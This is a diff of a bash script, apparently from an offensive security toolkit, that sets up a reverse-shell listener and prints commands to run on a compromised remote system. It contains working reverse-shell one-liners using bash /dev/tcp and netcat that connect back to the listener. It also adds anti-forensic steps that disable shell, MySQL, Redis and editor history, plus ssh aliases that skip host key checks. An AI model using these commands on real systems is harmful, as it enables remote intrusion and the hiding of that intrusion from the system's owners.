@@ -1,11 +1,7 @@
 #! /usr/bin/env bash
 
 source /sf/bin/funcs.sh
-
-load() {
-    [[ ! -f "$2" ]] && return 255
-    eval "${1}=$(<"$2")"
-}
+source /sf/bin/funcs_rport.sh
 
 ERREXIT() {
     local code="$1"
@@ -16,31 +12,39 @@ ERREXIT() {
     exit "${code:-99}"
 }
 
-[[ ! -f /config/self/reverse_port ]] && curl sf/port
-load rport /config/self/reverse_port || ERREXIT 255 "No reverse port found. Try ${CC}curl sf/port${CN}."
-load rip /config/self/reverse_ip || ERREXIT 255 "No reverse port found. Try ${CC}curl sf/port${CN}."
+sf_rport_load_all || exit
 echo -e "\
 Use one of these commands on the remote system:
     1. ${CDR}bash -c '(exec bash -i &>/dev/tcp/${rip}/${rport} 0>&1) &'${CN}
-    2. ${CDR}(bash -i &>/dev/tcp/${rip}/${rport} 0>&1) &${CN}
+    2. ${CDR}U=/tmp/.\$\$;rm -f \$U;touch \$U;(tail -f \$U|sh 2>&1|nc -n ${rip} ${rport} >\$U 2>&1 &)
 ${CN}Once connected, cut & paste the following into the _this_ shell:
 ${CF}-------------------------------------------------------------------------------${CDC}
 command -v python >/dev/null \\
-    && exec python -c 'import pty; pty.spawn(\"bash\")' \\
-    || exec script -qc bash /dev/null
+    && exec python -c \"import pty; pty.spawn('\${SHELL:-sh}')\" \\
+    || { command -v script >/dev/null && exec script -qc \"\${SHELL:-sh}\" /dev/null; }
+unset HISTFILE
 export SHELL=/bin/bash TERM=xterm-256color
+export LESSHISTFILE=-
+export REDISCLI_HISTFILE=/dev/null
+export MYSQL_HISTFILE=/dev/null
+alias ssh='ssh -o UpdateHostKeys=no -o StrictHostKeyChecking=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss'
+alias scp='scp -o UpdateHostKeys=no -o StrictHostKeyChecking=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss'
+alias wget='wget --no-hsts'
+alias vi='vi -i NONE'
+alias vim='vim -i NONE'
 reset -I
 PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'
-"'stty -echo;printf "\\033[18t";read -rdt R;stty sane $(echo "$R"|awk -F";" '"'"'{ printf "rows "$3" cols "$2; }'"'"')'"
+"'stty -echo;printf "\\033[18t";read -t5 -rdt R;stty sane $(echo "$R"|awk -F";" '"'"'{ printf "rows "$3" cols "$2; }'"'"')'"
 ${CN}${CF}-------------------------------------------------------------------------------${CN}
 To force-exit this listener, type ${CDY}kill \"\$(pgrep -P $$)\"${CN} on your Root Server"
 # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
 
 cfg=$(stty --save)
-stty raw  -echo opost
+# alpine's /bin/sh needs ^M -> \n
+stty raw -echo icrnl opost
 echo -e "${CDG}Listening on ${CG}${rip}:${rport}${CN}"
-nc -nlp "$rport"
+nc -nvlp "$rport"
 echo "🦋 Restoring terminal..."
 stty "$cfg"
 # reset -I
-
+π
